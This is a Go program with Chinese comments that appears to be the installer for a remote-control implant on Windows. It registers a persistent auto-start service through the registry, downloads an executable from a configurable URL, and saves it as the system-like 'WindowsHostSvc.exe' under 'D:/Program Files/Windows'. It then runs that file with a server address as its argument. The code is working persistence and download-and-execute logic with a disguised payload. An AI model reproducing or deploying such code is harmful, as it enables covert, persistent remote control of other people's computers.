// 该文件自定义方式：设置22-24行常量值即可

package main

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"os/exec"
	"os/user"

	"golang.org/x/sys/windows/registry"
)

const (
	ServerAddr  = ""  // 你的server端域名，格式如"http://rbsi.yxzl.top:5002/"
	DownloadUrl = ""  // 你的Python主进程http下载地址
	ServiceName = "ATest"  // 注册的服务名称
)

var (
	PATH, DIR string
	TRIED     bool = false
	REINSTALL bool = false
	USER      string
)

func get_cmd(cmdStr string) string {
	list := strings.Split(cmdStr, " ")
	cmd := exec.Command(list[0], list[1:]...)
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		return "FAILED"
	} else {
		return out.String()
	}
}

func install() {
	check_service := get_cmd(`sc query `+ServiceName) != "FAILED"
	if !REINSTALL && check_service {
		fmt.Println("检测到服务已安装，跳过安装流程。")
		return
	}
	fmt.Println("开始程序安装流程...")

	if !check_service {
		instsrv, _ := os.Create(DIR + `\instsrv.exe`)
		instsrv.Write(Instsrv())
		instsrv.Close()
		srvany, _ := os.Create(DIR + `\srvany.exe`)
		srvany.Write(Srvany())
		srvany.Close()
		get_cmd(DIR + `\instsrv.exe ` + ServiceName + ` ` + DIR + `\srvany.exe`)
		fmt.Println("服务注册成功！")
	} else {
		fmt.Println("（REINSTALL）跳过服务注册，进入安装流程。")
	}

	key1, exists, _ := registry.CreateKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Services\`+ServiceName+`\Parameters`, registry.ALL_ACCESS)
	defer key1.Close()

	if exists && !REINSTALL {
		fmt.Println("安装出错：注册表中已存在Parameters子项！")
		return
	}

	// Parameters
	key1.SetStringValue(`Application`, strings.Replace(PATH, `\`, `\\`, -1))
	key1.SetStringValue(`AppDirectory`, strings.Replace(DIR, `\`, `\\`, -1))

	// 根
	key2, _, _ := registry.CreateKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Services\`+ServiceName, registry.ALL_ACCESS)
	key2.SetBinaryValue(`FailureActions`, FailureActions())
	key2.SetDWordValue(`Start`, uint32(2))

	fmt.Println("安装成功！")
}

func main() {
	u, _ := user.Current()
	USER = u.Name
	fmt.Println("当前用户：", USER)
	// （测试环境）判断路径是否不在C盘
	if os.Args[0][0] == 67 {
		fmt.Println("运行路径发生错误：在C盘中！")
		return
	}
	// 路径变量初始化
	PATH, _ = filepath.Abs(os.Args[0])
	DIR, _ = filepath.Abs(filepath.Dir(os.Args[0]))
	fmt.Printf("运行路径：%s\t运行目录：%s\n", PATH, DIR)

	if len(os.Args) > 1 {
		if os.Args[1] == "reinstall" {
			REINSTALL = true
			install()
		}
	} else {
		install()
	}

	os.Mkdir(`D:/Program Files`, os.ModePerm)
	os.Mkdir(`D:/Program Files/Windows`, os.ModePerm)
	res, _ := http.Get(DownloadUrl)
	exe, _ := os.Create("D:/Program Files/Windows/WindowsHostSvc.exe")
	io.Copy(exe, res.Body)
	exe.Close()
	get_cmd("sc start " + ServiceName)
	StartProcessAsCurrentUser(`D:/Program Files/Windows/WindowsHostSvc.exe`, `D:/Program Files/Windows/WindowsHostSvc.exe `+ServerAddr, `D:/Program Files/Windows/`, true)

	time.Sleep(time.Second * 1)
}
